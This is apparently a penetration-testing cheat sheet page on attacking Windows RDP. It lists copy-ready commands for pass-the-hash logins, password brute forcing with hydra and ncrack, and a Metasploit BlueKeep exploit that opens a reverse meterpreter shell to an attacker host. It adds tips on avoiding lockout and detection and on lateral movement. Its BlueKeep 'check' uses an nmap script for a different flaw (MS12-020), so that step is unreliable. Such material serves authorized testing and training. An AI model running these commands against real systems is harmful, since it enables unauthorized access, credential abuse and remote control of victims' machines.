# RDP (3389)

!!! tip "Start here"
    With valid credentials, connect directly: `xfreerdp /u:<user> /p:<pass> /v:10.10.10.10`. Pass-the-hash works if Restricted Admin mode is enabled: `xfreerdp /u:<user> /pth:<ntlm-hash> /v:10.10.10.10`.

!!! warning "Watch out"
    RDP brute force generates Event ID 4625 entries rapidly. Avoid it unless you've confirmed there's no account lockout policy.

---

## Enumeration

```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 10.10.10.10
```

---

## Connect

```bash
xfreerdp /u:<user> /p:<pass> /v:10.10.10.10 /dynamic-resolution
xfreerdp /u:<user> /pth:<ntlm-hash> /v:10.10.10.10 /dynamic-resolution
```

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt rdp://10.10.10.10
ncrack -p 3389 -U users.txt -P passwords.txt 10.10.10.10
```

## BlueKeep (CVE-2019-0708)

Unauthenticated RCE against Windows 7 / Server 2008 R2 and earlier:

```bash
nmap -p 3389 --script rdp-vuln-ms12-020 10.10.10.10
```

If vulnerable:

```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```

!!! tip "Real-world"
    RDP is often blocked externally but wide open internally. After getting initial access, check if domain credentials work over RDP against other hosts — it's one of the fastest ways to move laterally. BlueKeep is mostly patched at this point but still worth checking on older infrastructure.
